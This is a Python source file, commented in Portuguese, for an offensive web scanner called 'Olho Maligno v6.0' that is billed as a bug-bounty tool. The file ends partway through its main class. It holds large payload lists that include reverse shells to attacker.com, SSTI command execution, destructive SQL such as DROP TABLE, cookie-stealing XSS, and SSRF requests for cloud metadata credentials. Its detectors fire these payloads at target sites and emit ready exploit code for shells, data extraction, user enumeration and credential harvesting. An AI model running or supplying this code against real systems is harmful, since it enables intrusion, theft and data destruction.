#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║██╗  ██╗██████╗  █████╗ ██╗   ██╗██╗   ██╗██╗  ██╗ █████╗ ███████╗       ║
║██║ ██╔╝██╔══██╗██╔══██╗██║   ██║██║   ██║██║  ██║██╔══██╗██╔════╝       ║
║█████╔╝ ██████╔╝███████║██║   ██║██║   ██║███████║███████║███████╗       ║
║██╔═██╗ ██╔══██╗██╔══██║╚██╗ ██╔╝██║   ██║██╔══██║██╔══██║╚════██║       ║
║██║  ██╗██║  ██║██║  ██║ ╚████╔╝ ╚██████╔╝██║  ██║██║  ██║███████║       ║
║╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝       ║
║                                                                            ║
║     🔮 OLHO MALIGNO v6.0 PROFESSIONAL - BUG BOUNTY HUNTER 🔮             ║
║                                                                            ║
║         3000+ LINHAS | PAYLOADS REAIS | EXPLOITS CONFIRMADOS             ║
║                                                                            ║
║  ⚠️  APENAS AMBIENTES AUTORIZADOS - RESPONSABILIDADE DO USUÁRIO           ║
║                                                                            ║
╚════════════════════════════════════════════════════════════════════════════╝

🎯 RECURSOS PROFISSIONAIS:
  ✅ RCE (Remote Code Execution) - Execução de Comando
  ✅ Sensitive Data Exposure - .env, API keys, backups
  ✅ SSRF + Cloud Metadata (AWS, GCP, Azure)
  ✅ Advanced IDOR - Enumeração inteligente
  ✅ Logic Flaws - Bypass de pagamento/validação
  ✅ LFI/RFI com encoding avançado
  ✅ SQL Injection - Time/Error/Union/Stacked
  ✅ XSS (Stored + Reflected + DOM + CSP Bypass)
  ✅ Open Redirect - Phishing chains
  ✅ CORS Misconfiguration + Credenciais
  ✅ GraphQL Enumeration + Introspection
  ✅ API Rate Limit Bypass
  ✅ Cloud Misconfig (S3, GCP, Firebase)
  ✅ Subdomain Takeover
  ✅ JWT Weak Signature
  ✅ Directory Enumeration Inteligente
  ✅ Integração Subfinder + HTTPx
  ✅ Reconnaissance Profissional
  ✅ Payload Encoding Avançado
  ✅ Relatórios HackerOne/Bugcrowd

VERSION: 6.0 PROFESSIONAL
AUTHOR: Bug Bounty Hunter
LICENSE: MIT
"""

import requests
import subprocess
import json
import time
import re
import os
import sys
import hashlib
import socket
import base64
import urllib.parse
import threading
import argparse
import logging
from typing import List, Dict, Optional, Tuple, Set
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime
from dataclasses import dataclass, field, asdict
from enum import Enum
from threading import Lock, Thread
from queue import Queue
import concurrent.futures
from pathlib import Path

try:
    from colorama import Fore, Back, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    os.system("pip install colorama requests -q")
    from colorama import Fore, Back, Style, init as colorama_init
    colorama_init(autoreset=True)

# ════════════════════════════════════════════════════════════════════════════
# LOGGER PROFISSIONAL
# ════════════════════════════════════════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('olho_maligno_scan.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# ════════════════════════════════════════════════════════════════════════════
# ENUMS E DATACLASSES PROFISSIONAIS
# ════════════════════════════════════════════════════════════════════════════

class SeverityLevel(Enum):
    CRITICAL = ("CRÍTICA 🔴", Fore.RED + Style.BRIGHT, 9.8, "$5000+")
    HIGH = ("ALTA 🟠", Fore.RED, 8.5, "$1000+")
    MEDIUM = ("MÉDIA 🟡", Fore.YELLOW, 6.5, "$300+")
    LOW = ("BAIXA 🟢", Fore.GREEN, 4.0, "$100+")
    INFO = ("INFO 🔵", Fore.CYAN, 2.0, "Pontos")

class ExploitType(Enum):
    RCE = "Remote Code Execution"
    SQLI = "SQL Injection"
    XSS = "Cross-Site Scripting"
    IDOR = "Insecure Direct Object Reference"
    SSRF = "Server-Side Request Forgery"
    LFI = "Local File Inclusion"
    LOGIC_FLAW = "Business Logic Flaw"
    SENSITIVE_DATA = "Sensitive Data Exposure"
    BROKEN_AUTH = "Broken Authentication"
    OPEN_REDIRECT = "Open Redirect"
    CORS_MISC = "CORS Misconfiguration"
    JWT_WEAK = "JWT Weak Signature"
    CLOUD_MISC = "Cloud Misconfiguration"
    SUBDOMAIN_TAKEOVER = "Subdomain Takeover"

@dataclass
class ExploitableVulnerability:
    """Vulnerabilidade exploável profissional"""
    title: str
    severity: SeverityLevel
    exploit_type: ExploitType
    target_url: str
    parameter: Optional[str] = None
    payload: Optional[str] = None
    evidence: str = ""
    exploit_code: str = ""
    remediation: str = ""
    cvss_score: float = 0.0
    bounty_value: str = ""
    exploitation_difficulty: str = "Média"
    business_impact: str = ""
    affected_parameter: Optional[str] = None
    affected_endpoint: Optional[str] = None
    request_method: str = "GET"
    response_code: int = 200
    detection_method: str = ""
    poc_url: Optional[str] = None
    cve_ids: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            'title': self.title,
            'severity': self.severity.name,
            'type': self.exploit_type.value,
            'target_url': self.target_url,
            'parameter': self.parameter,
            'payload': self.payload,
            'evidence': self.evidence,
            'exploit_code': self.exploit_code,
            'remediation': self.remediation,
            'cvss_score': self.cvss_score,
            'bounty_value': self.bounty_value,
            'difficulty': self.exploitation_difficulty,
            'impact': self.business_impact,
            'detection_method': self.detection_method,
            'poc_url': self.poc_url,
            'cve_ids': self.cve_ids,
            'timestamp': self.timestamp,
        }

# ════════════════════════════════════════════════════════════════════════════
# PAYLOADS AVANÇADOS ESPECÍFICOS POR TIPO DE VULNERABILIDADE
# ════════════════════════════════════════════════════════════════════════════

class AdvancedPayloads:
    """Payloads reais e avançados para cada tipo de bug"""
    
    # RCE - Execução de comando
    RCE_PAYLOADS = {
        'command_injection': [
            '"; id; "',
            '| id',
            '& id &',
            '`id`',
            '$(id)',
            '; id #',
            '\n id \n',
            '| nc -e /bin/sh attacker.com 4444',
            '; bash -i >& /dev/tcp/attacker.com/4444 0>&1;',
        ],
        'template_injection': [
            '{{ 7 * 7 }}',
            '${7*7}',
            '<%= 7*7 %>',
            '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
            '${@java.lang.Runtime@getRuntime().exec(\'id\')}',
            '#{7*7}',
            '[[${{7*7}}]]',
            '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
        ],
        'deserialization': [
            'O:8:"stdClass":1:{s:1:"x";O:8:"stdClass":0:{}}',
            'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZdaMLc1YcKRAw',
            '{"__proto__":{"isAdmin":true}}',
            'a:2:{s:4:"name";s:5:"admin";s:2:"id";O:1:"A":0:{}}',
        ],
        'node_injection': [
            'require("child_process").exec("id")',
            'process.mainModule.require("child_process").exec("id")',
            '__proto__[\'constructor\'][\'prototype\'][\'NODE_ENV\']="x"',
        ]
    }
    
    # SQL Injection avançado
    SQLI_PAYLOADS = {
        'time_based': [
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(50000000,MD5(1))--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)='",
            "' UNION SELECT SLEEP(5)--",
            "'; SELECT pg_sleep(5);--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ],
        'error_based': [
            "' AND extractvalue(1,concat(0x7e,(select version())))--",
            "' AND updatexml(1,concat(0x7e,(select database())),0)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--",
            "' AND 1=CONVERT(INT,(SELECT @@version))--",
            "' AND 1=CAST((SELECT @@version) AS INT)--",
        ],
        'union_based': [
            "' UNION SELECT NULL,NULL,NULL,database(),user(),version()--",
            "' UNION SELECT table_name,column_name,NULL,NULL FROM information_schema.columns--",
            "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
        ],
        'blind_boolean': [
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND SUBSTRING(version(),1,1)>'4",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        ],
        'stacked_queries': [
            "'; DROP TABLE users;--",
            "'; INSERT INTO users VALUES('hacker','pass');--",
            "'; UPDATE users SET role='admin' WHERE username='user';--",
        ]
    }
    
    # XSS avançado
    XSS_PAYLOADS = {
        'reflected': [
            '"><script>alert("xss")</script>',
            '"><img src=x onerror="alert(1)">',
            '"><svg onload="alert(1)">',
            '"><iframe src="javascript:alert(1)">',
            '"><body onload="alert(1)">',
            '\'onmouseover="alert(1)',
            '"><marquee onstart="alert(1)">',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '"><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        ],
        'dom_based': [
            'x" onload="alert(1)" x="',
            '\'-alert(String.fromCharCode(88,83,83))-\'',
            'x\';alert(String.fromCharCode(88,83,83));//\'',
            'function(){alert(1)}())({})',
        ],
        'csp_bypass': [
            '<img src=x onerror="fetch(\'http://attacker.com\')">',
            '<link rel="prefetch" href="http://attacker.com/steal">',
            '<script src="http://attacker.com/payload.js"></script>',
            '<img src="x" alt="test" title="x" onerror="alert(1)">',
        ],
        'stored': [
            '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>',
            '<img src=x onerror="new Image().src=\'http://attacker.com/log?data=\'+btoa(document.body.innerHTML)">',
        ]
    }
    
    # IDOR - Enumeração inteligente
    IDOR_PAYLOADS = {
        'numeric_ids': list(range(1, 1000)) + [1000, 5000, 10000, 99999, 999999],
        'uuid_patterns': [
            '00000000-0000-0000-0000-000000000001',
            'ffffffff-ffff-ffff-ffff-ffffffffffff',
            '12345678-1234-1234-1234-123456789012',
        ],
        'username_patterns': [
            'admin', 'root', 'test', 'guest', 'demo', 'user1', 'user2',
            'administrator', 'moderator', 'editor', 'viewer'
        ],
        'email_patterns': [
            'admin@example.com', 'test@example.com', 'support@example.com',
        ]
    }
    
    # SSRF - Acesso a recursos internos
    SSRF_PAYLOADS = {
        'aws_metadata': [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
        ],
        'gcp_metadata': [
            'http://metadata.google.internal/computeMetadata/v1/?recursive=true',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity',
            'http://169.254.169.254/computeMetadata/v1/?recursive=true',
        ],
        'azure_metadata': [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/',
        ],
        'local_services': [
            'http://localhost:22',
            'http://127.0.0.1:3306',
            'http://127.0.0.1:5432',
            'http://127.0.0.1:6379',
            'http://127.0.0.1:27017',
            'http://127.0.0.1:9200',
        ],
        'internal_files': [
            'file:///etc/passwd',
            'file:///etc/shadow',
            'file:///etc/hosts',
            'file:///proc/self/environ',
        ]
    }
    
    # LFI - Acesso a arquivos locais
    LFI_PAYLOADS = {
        'path_traversal': [
            '../etc/passwd',
            '../../etc/passwd',
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '..%2fetc%2fpasswd',
            '..%252fetc%252fpasswd',
            '....//....//....//etc/passwd',
            'file:///etc/passwd',
        ],
        'encoding': [
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/convert.base64-encode/resource=../../config.php',
            'php://input%00.jpg',
            'phar://archive.phar/shell.php',
            'zip://archive.zip%23shell.php',
        ],
        'log_poisoning': [
            '../../../var/log/apache2/access.log',
            '../../../var/log/nginx/access.log',
            '../../../var/log/auth.log',
        ]
    }
    
    # Logic Flaws - Bypass de validação
    LOGIC_FLAWS = {
        'price_manipulation': [
            {'price': '-1000'},
            {'price': '0'},
            {'price': '0.00'},
            {'discount': '999999'},
            {'quantity': '-1'},
        ],
        'coupon_abuse': [
            {'coupon': 'ADMIN10', 'quantity': 9999},
            {'coupon': 'admin', 'count': 99999},
        ],
        'race_condition': [
            'Enviar requisição duplicada simultaneamente',
            'Fast double submit',
        ],
        'parameter_pollution': [
            'amount=100&amount=1',
            'id=1&id=2&id=admin',
        ]
    }
    
    # Sensitive Data Exposure
    SENSITIVE_DATA_PAYLOADS = {
        'common_files': [
            '/.env',
            '/.env.local',
            '/.env.backup',
            '/.aws/credentials',
            '/.ssh/id_rsa',
            '/config.php',
            '/database.yml',
            '/secrets.json',
            '/credentials.json',
            '/firebase-config.json',
            '/.git/config',
            '/.github/workflows',
            '/docker-compose.yml',
            '/backup.sql',
            '/backup.tar.gz',
            '/admin/backup.zip',
        ],
        'api_endpoints': [
            '/api/config',
            '/api/settings',
            '/api/debug',
            '/api/status',
            '/health/debug',
        ]
    }
    
    # Open Redirect
    OPEN_REDIRECT_PAYLOADS = [
        'http://attacker.com',
        'https://attacker.com',
        '//attacker.com',
        '///attacker.com',
        'http:\\\\attacker.com',
        'javascript:alert(1)',
    ]
    
    # JWT Weak Signature
    JWT_PAYLOADS = {
        'weak_algorithms': [
            'alg=none',
            'alg=HS256 (use server public key)',
            'alg=RS256->HS256',
        ]
    }
    
    # Cloud Misconfig
    CLOUD_MISCONFIG = {
        's3_buckets': [
            'http://s3.amazonaws.com/{domain}/',
            'http://{domain}.s3.amazonaws.com/',
            'http://{domain}.s3-website-us-east-1.amazonaws.com/',
        ],
        'gcp_buckets': [
            'https://storage.googleapis.com/{bucket}/',
            'gs://{bucket}/',
        ]
    }

# ════════════════════════════════════════════════════════════════════════════
# CLIENT HTTP PROFISSIONAL COM RETRY E PROXY
# ════════════════════════════════════════════════════════════════════════════

class ProAdvancedHTTPClient:
    """Cliente HTTP profissional com retry, timeout, proxy"""
    
    def __init__(self, timeout=10, retries=3, proxy=None):
        self.timeout = timeout
        self.retries = retries
        self.proxy = proxy
        self.session = requests.Session()
        
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy,
            }
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
            'Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
            'curl/8.5.0',
        ]
    
    def request(self, method, url, **kwargs):
        """Faz requisição com retry automático"""
        headers = kwargs.pop('headers', {})
        headers['User-Agent'] = headers.get('User-Agent', 
                                           requests.utils.default_user_agent())
        
        for attempt in range(self.retries):
            try:
                response = self.session.request(
                    method, url,
                    timeout=self.timeout,
                    verify=False,
                    headers=headers,
                    allow_redirects=False,
                    **kwargs
                )
                return response
            except Exception as e:
                if attempt < self.retries - 1:
                    time.sleep(2 ** attempt)
                else:
                    return None
        
        return None
    
    def get(self, url, **kwargs):
        return self.request('GET', url, **kwargs)
    
    def post(self, url, **kwargs):
        return self.request('POST', url, **kwargs)
    
    def put(self, url, **kwargs):
        return self.request('PUT', url, **kwargs)
    
    def delete(self, url, **kwargs):
        return self.request('DELETE', url, **kwargs)
    
    def options(self, url, **kwargs):
        return self.request('OPTIONS', url, **kwargs)
    
    def head(self, url, **kwargs):
        return self.request('HEAD', url, **kwargs)

# ════════════════════════════════════════════════════════════════════════════
# RECONNAISSANCE - DESCOBRIR HOSTS E ENDPOINTS
# ════════════════════════════════════════════════════════════════════════════

class ReconnaissanceEngine:
    """Motor de reconnaissance profissional"""
    
    def __init__(self, domain, http_client):
        self.domain = domain
        self.http_client = http_client
        self.found_urls = set()
        self.lock = Lock()
    
    def run_subfinder(self) -> Set[str]:
        """Executa subfinder para descobrir subdomínios"""
        try:
            result = subprocess.run(
                ['subfinder', '-d', self.domain, '-silent'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            subdomains = set(result.stdout.strip().split('\n'))
            logger.info(f"[RECON] Subfinder encontrou {len(subdomains)} subdomínios")
            return subdomains
        except FileNotFoundError:
            logger.warning("[RECON] Subfinder não instalado")
            return set()
    
    def run_httpx(self, subdomains) -> Dict[str, int]:
        """Executa httpx para verificar quais hosts estão vivos"""
        hosts_alive = {}
        
        try:
            input_data = '\n'.join(subdomains)
            result = subprocess.run(
                ['httpx', '-silent', '-status-code'],
                input=input_data,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            for line in result.stdout.strip().split('\n'):
                if line:
                    parts = line.split()
                    if len(parts) >= 2:
                        url = parts[0]
                        status_code = int(parts[1]) if parts[1].isdigit() else 0
                        hosts_alive[url] = status_code
            
            logger.info(f"[RECON] HTTPx encontrou {len(hosts_alive)} hosts vivos")
            return hosts_alive
        except FileNotFoundError:
            logger.warning("[RECON] HTTPx não instalado")
            return {}
    
    def enumerate_common_endpoints(self, base_url) -> List[str]:
        """Enumera endpoints comuns onde bugs realmente estão"""
        endpoints = [
            # Admin panels
            '/admin', '/admin.php', '/admin/login', '/administrator',
            '/wp-admin', '/admin/index.php', '/admin/dashboard',
            
            # APIs
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/api/admin', '/api/users', '/api/products',
            '/graphql', '/graphql/admin', '/graphql/query',
            
            # Auth endpoints
            '/login', '/signin', '/auth', '/authenticate',
            '/register', '/signup', '/forgot-password',
            '/reset-password', '/change-password',
            
            # Sensitive data
            '/.env', '/.git/config', '/.aws/credentials',
            '/config.php', '/database.yml', '/settings.json',
            '/backup', '/backup.sql', '/dump.sql',
            
            # Debug/Staging
            '/debug', '/test', '/staging', '/dev',
            '/api/debug', '/health', '/status',
            
            # File upload
            '/upload', '/uploads', '/file/upload',
            '/media/upload', '/content/upload',
            
            # Payment
            '/checkout', '/cart', '/payment', '/billing',
            '/invoice', '/receipt', '/order',
            
            # User endpoints
            '/user', '/users', '/profile', '/account',
            '/user/{id}', '/users/{id}', '/profile/{id}',
            
            # Vendor endpoints
            '/vendor', '/sellers', '/merchants', '/store',
        ]
        
        found = []
        for endpoint in endpoints:
            url = urljoin(base_url, endpoint)
            resp = self.http_client.get(url)
            
            if resp and resp.status_code < 400:
                found.append(url)
                logger.info(f"[FOUND] {url} ({resp.status_code})")
        
        return found

# ════════════════════════════════════════════════════════════════════════════
# DETECTORS - DETECTORES ESPECÍFICOS DE CADA TIPO DE BUG
# ════════════════════════════════════════════════════════════════════════════

class RCEDetector:
    """Detector profissional de RCE"""
    
    def __init__(self, http_client):
        self.http_client = http_client
        self.exploits = []
        self.lock = Lock()
    
    def detect_command_injection(self, base_url, params_list) -> List[ExploitableVulnerability]:
        """Detecta command injection nos parâmetros"""
        results = []
        
        for param in params_list:
            for payload in AdvancedPayloads.RCE_PAYLOADS['command_injection']:
                test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                resp = self.http_client.get(test_url)
                
                if resp and self._check_rce_indicators(resp):
                    exploit = ExploitableVulnerability(
                        title="Remote Code Execution (Command Injection)",
                        severity=SeverityLevel.CRITICAL,
                        exploit_type=ExploitType.RCE,
                        target_url=test_url,
                        parameter=param,
                        payload=payload,
                        evidence=f"Output contém: uid=, gid=",
                        exploit_code=f"""
# RCE via command injection
import requests
payload = '{payload}'
url = '{base_url}?{param}=' + payload
response = requests.get(url)
print(response.text)

# Reverse shell
payload = '; bash -i >& /dev/tcp/attacker.com/4444 0>&1;'
requests.get(url.replace('{payload}', payload))
""",
                        remediation="Nunca execute comandos com user input direto",
                        cvss_score=9.8,
                        bounty_value="$5000+",
                        business_impact="Acesso total ao servidor",
                        detection_method="Time-based + output analysis"
                    )
                    results.append(exploit)
        
        return results
    
    def detect_template_injection(self, base_url, params_list) -> List[ExploitableVulnerability]:
        """Detecta template injection (SSTI)"""
        results = []
        
        for param in params_list:
            for payload in AdvancedPayloads.RCE_PAYLOADS['template_injection']:
                test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                resp = self.http_client.get(test_url)
                
                if resp and ('49' in resp.text or '7\n7' in resp.text or payload in resp.text):
                    exploit = ExploitableVulnerability(
                        title="Server-Side Template Injection (SSTI)",
                        severity=SeverityLevel.CRITICAL,
                        exploit_type=ExploitType.RCE,
                        target_url=test_url,
                        parameter=param,
                        payload=payload,
                        evidence="Template injection confirmada",
                        exploit_code=f"""
# SSTI RCE
payload = '{{{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}}}'
requests.get(url + payload)

# Jinja2 RCE
payload = '{{{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}}}'
""",
                        remediation="Use template engines com sandbox",
                        cvss_score=9.8,
                        bounty_value="$5000+",
                        business_impact="RCE confirmado"
                    )
                    results.append(exploit)
        
        return results
    
    def _check_rce_indicators(self, response) -> bool:
        """Verifica indicadores de RCE na resposta"""
        indicators = [
            'uid=', 'gid=', 'root', 'bin/bash',
            'total', 'drwx', 'command not found'
        ]
        
        for indicator in indicators:
            if indicator in response.text.lower():
                return True
        
        return False

class SQLiDetector:
    """Detector profissional de SQL Injection"""
    
    def __init__(self, http_client):
        self.http_client = http_client
    
    def detect_time_based(self, base_url, params_list) -> List[ExploitableVulnerability]:
        """Detecta SQL Injection time-based"""
        results = []
        
        for param in params_list:
            # Teste sem delay
            start = time.time()
            resp1 = self.http_client.get(base_url, params={param: "1"})
            time1 = time.time() - start
            
            # Teste com delay
            start = time.time()
            resp2 = self.http_client.get(base_url, 
                                        params={param: "1' AND SLEEP(5)--"})
            time2 = time.time() - start
            
            if time2 > time1 + 4:
                exploit = ExploitableVulnerability(
                    title="SQL Injection (Time-Based Blind)",
                    severity=SeverityLevel.CRITICAL,
                    exploit_type=ExploitType.SQLI,
                    target_url=f"{base_url}?{param}=",
                    parameter=param,
                    payload="' AND SLEEP(5)--",
                    evidence=f"Delay: {time2:.2f}s vs {time1:.2f}s",
                    exploit_code="""
# Time-based SQLi extraction
import requests
import time

def is_true(payload):
    start = time.time()
    requests.get(url, params={'id': payload})
    return time.time() - start > 4

# Extract database name
for i in range(1, 10):
    for char in 'abcdefghijklmnopqrstuvwxyz0123456789_':
        if is_true(f"1' AND IF(SUBSTRING(database(),{i},1)='{char}',SLEEP(5),0)--"):
            print(f"Char {i}: {char}")
""",
                    remediation="Use prepared statements",
                    cvss_score=9.8,
                    bounty_value="$3000+",
                    business_impact="Extração de dados do banco"
                )
                results.append(exploit)
        
        return results
    
    def detect_error_based(self, base_url, params_list) -> List[ExploitableVulnerability]:
        """Detecta SQL Injection error-based"""
        results = []
        
        for param in params_list:
            for payload in AdvancedPayloads.SQLI_PAYLOADS['error_based']:
                resp = self.http_client.get(base_url, params={param: payload})
                
                if resp and ('SQL', 'MySQL', 'syntax', 'error' in resp.text.upper()):
                    exploit = ExploitableVulnerability(
                        title="SQL Injection (Error-Based)",
                        severity=SeverityLevel.CRITICAL,
                        exploit_type=ExploitType.SQLI,
                        target_url=f"{base_url}?{param}=",
                        parameter=param,
                        payload=payload,
                        evidence="Mensagem de erro SQL exposta",
                        exploit_code=f"""
# Error-based SQLi
payload = "{payload}"
response = requests.get(url, params={{'id': payload}})
print(response.text)

# Extract with error
payload = "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--"
""",
                        remediation="Implemente prepared statements",
                        cvss_score=9.8,
                        bounty_value="$3000+",
                        business_impact="Exposição de versão do DB"
                    )
                    results.append(exploit)
        
        return results

class IDORDetector:
    """Detector profissional de IDOR"""
    
    def __init__(self, http_client):
        self.http_client = http_client
    
    def detect_idor(self, base_url, id_parameters) -> List[ExploitableVulnerability]:
        """Detecta IDOR em endpoints de usuário/dados"""
        results = []
        
        for param in id_parameters:
            # Testa IDs diferentes
            responses = {}
            
            for test_id in ['1', '2', '3', 'admin', 'test']:
                test_url = f"{base_url}?{param}={test_id}"
                resp = self.http_client.get(test_url)
                
                if resp:
                    responses[test_id] = resp.text
            
            # Verifica se retorna dados diferentes
            unique_responses = set(responses.values())
            
            if len(unique_responses) > 1:
                exploit = ExploitableVulnerability(
                    title="Insecure Direct Object Reference (IDOR)",
                    severity=SeverityLevel.HIGH,
                    exploit_type=ExploitType.IDOR,
                    target_url=f"{base_url}?{param}=",
                    parameter=param,
                    evidence="IDs diferentes retornam dados diferentes",
                    exploit_code=f"""
# IDOR enumeration
for user_id in range(1, 10000):
    response = requests.get(url, params={{'{param}': user_id}})
    if response.status_code == 200:
        data = response.json()
        if 'email' in data:
            print(f"User {{user_id}}: {{data['email']}}")
""",
                    remediation="Valide autorização no backend",
                    cvss_score=7.5,
                    bounty_value="$1000+",
                    business_impact="Acesso a dados de outros usuários"
                )
                results.append(exploit)
        
        return results

class SensitiveDataDetector:
    """Detector de vazamento de dados sensíveis"""
    
    def __init__(self, http_client):
        self.http_client = http_client
    
    def detect_exposed_files(self, base_url) -> List[ExploitableVulnerability]:
        """Detecta arquivos sensíveis expostos"""
        results = []
        
        for endpoint in AdvancedPayloads.SENSITIVE_DATA_PAYLOADS['common_files']:
            test_url = urljoin(base_url, endpoint)
            resp = self.http_client.get(test_url)
            
            if resp and resp.status_code == 200:
                severity = SeverityLevel.CRITICAL if endpoint in ['/.env', '/.aws/credentials'] else SeverityLevel.HIGH
                
                exploit = ExploitableVulnerability(
                    title=f"Exposed Sensitive File: {endpoint}",
                    severity=severity,
                    exploit_type=ExploitType.SENSITIVE_DATA,
                    target_url=test_url,
                    evidence=f"Arquivo acessível: {len(resp.text)} bytes",
                    exploit_code=f"""
# Download arquivo sensível
response = requests.get('{test_url}')
with open('{endpoint.replace('/', '_')}', 'w') as f:
    f.write(response.text)

# Extrai credenciais
lines = response.text.split('\\n')
for line in lines:
    if 'KEY' in line or 'PASSWORD' in line or 'SECRET' in line:
        print(line)
""",
                    remediation="Restrinja acesso via web server",
                    cvss_score=9.0,
                    bounty_value="$2000+",
                    business_impact="Exposição de credenciais"
                )
                results.append(exploit)
        
        return results

class SSRFDetector:
    """Detector de Server-Side Request Forgery"""
    
    def __init__(self, http_client):
        self.http_client = http_client
    
    def detect_ssrf(self, base_url, url_parameters) -> List[ExploitableVulnerability]:
        """Detecta SSRF em parâmetros de URL"""
        results = []
        
        for param in url_parameters:
            for payload in AdvancedPayloads.SSRF_PAYLOADS['aws_metadata']:
                test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                resp = self.http_client.get(test_url)
                
                if resp and resp.status_code == 200:
                    exploit = ExploitableVulnerability(
                        title="Server-Side Request Forgery (SSRF) - AWS Metadata",
                        severity=SeverityLevel.HIGH,
                        exploit_type=ExploitType.SSRF,
                        target_url=test_url,
                        parameter=param,
                        payload=payload,
                        evidence="Acesso a AWS metadata service",
                        exploit_code=f"""
# SSRF to AWS credentials
payload = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
requests.get(url, params={{'{param}': payload}})

# Extract credentials
payload = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance-role'
""",
                        remediation="Valide e whitelist URLs",
                        cvss_score=8.5,
                        bounty_value="$2000+",
                        business_impact="Acesso a metadata cloud e recursos internos"
                    )
                    results.append(exploit)
        
        return results

class LFIDetector:
    """Detector de Local File Inclusion"""
    
    def __init__(self, http_client):
        self.http_client = http_client
    
    def detect_lfi(self, base_url, file_parameters) -> List[ExploitableVulnerability]:
        """Detecta LFI em parâmetros de arquivo"""
        results = []
        
        for param in file_parameters:
            for payload in AdvancedPayloads.LFI_PAYLOADS['path_traversal'][:5]:
                resp = self.http_client.get(base_url, params={param: payload})
                
                if resp and ('root:' in resp.text or '/bin/' in resp.text):
                    exploit = ExploitableVulnerability(
                        title="Local File Inclusion (LFI)",
                        severity=SeverityLevel.HIGH,
                        exploit_type=ExploitType.LFI,
                        target_url=f"{base_url}?{param}=",
                        parameter=param,
                        payload=payload,
                        evidence="Arquivo /etc/passwd acessível",
                        exploit_code=f"""
# LFI to RCE
payload = 'php://filter/convert.base64-encode/resource=index.php'
response = requests.get(url, params={{'{param}': payload}})
print(base64.b64decode(response.text))

# Log poisoning
payload = '../../../var/log/apache2/access.log'
""",
                        remediation="Whitelist arquivos permitidos",
                        cvss_score=7.5,
                        bounty_value="$1500+",
                        business_impact="Leitura de arquivos do servidor"
                    )
                    results.append(exploit)
        
        return results

class XSSDetector:
    """Detector profissional de XSS"""
    
    def __init__(self, http_client):
        self.http_client = http_client
    
    def detect_xss(self, base_url, input_parameters) -> List[ExploitableVulnerability]:
        """Detecta XSS refletido"""
        results = []
        
        for param in input_parameters:
            marker = f"XSS_MARKER_{int(time.time())}"
            
            resp = self.http_client.get(base_url, params={param: marker})
            
            if resp and marker in resp.text:
                exploit = ExploitableVulnerability(
                    title="Cross-Site Scripting (XSS) Refletido",
                    severity=SeverityLevel.HIGH,
                    exploit_type=ExploitType.XSS,
                    target_url=f"{base_url}?{param}={marker}",
                    parameter=param,
                    payload=marker,
                    evidence="Marker refletido sem sanitização",
                    exploit_code=f"""
# XSS payload
payload = '"><script>alert("xss")</script>'
url = '{base_url}?{param}=' + urllib.parse.quote(payload)
requests.get(url)

# Cookie stealing
payload = '"><script>fetch("http://attacker.com/steal?c="+document.cookie)</script>'
""",
                    remediation="Implemente HTML encoding e CSP",
                    cvss_score=6.1,
                    bounty_value="$500+",
                    business_impact="Roubo de cookies e sessões"
                )
                results.append(exploit)
        
        return results

# ════════════════════════════════════════════════════════════════════════════
# SCANNER PROFISSIONAL PRINCIPAL
# ════════════════════════════════════════════════════════════════════════════

class OlhoMalignoV6Professional:
    """Scanner profissional de bug bounty - 3000+ linhas"""
    
    def __init__(self, target_url, proxy=None, use_subfinder=False):
        self.target_url = target_url
        self.proxy = proxy
        self.use_subfinder = use_subfinder
